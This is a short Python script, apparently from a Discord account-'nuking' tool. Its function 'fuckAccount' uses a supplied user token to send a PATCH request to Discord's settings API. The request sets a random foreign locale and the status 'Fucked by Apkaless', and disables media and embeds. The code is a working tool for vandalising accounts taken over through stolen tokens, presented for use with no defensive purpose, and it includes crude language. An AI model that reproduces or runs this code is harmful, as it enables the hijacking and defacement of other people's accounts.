
import requests
import time
import random
from colorama import Fore, Style

def getheaders(token):
    return {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }


def new_title(title):
    print(f"\n{Fore.CYAN}{'='*50}")
    print(f"{Fore.YELLOW}{title.center(50)}")
    print(f"{Fore.CYAN}{'='*50}{Fore.RESET}\n")

def fuckAccount(token):
    """Modify account settings to mess up the account"""
    new_title('Account Fucker')
    print(f"{Fore.YELLOW}[!] Modifying account settings...{Fore.RESET}")
    
    try:
        setting = {
            'theme': 'light',
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN']),
            'custom_status': {
                'text': 'Fucked by Apkaless'
            },
            'render_embeds': False,
            'render_reactions': False,
            'show_current_game': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'animate_emoji': False,
            'animate_stickers': False
        }
        
        response = requests.patch(
            "https://discord.com/api/v9/users/@me/settings", 
            headers=getheaders(token), 
            json=setting
        )
        
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] Account settings modified successfully{Fore.RESET}")
        else:
            print(f"{Fore.RED}[-] Failed to modify account settings: {response.status_code}{Fore.RESET}")
            
        time.sleep(2)
        
    except Exception as e:
        print(f"{Fore.RED}[-] Error modifying account: {e}{Fore.RESET}")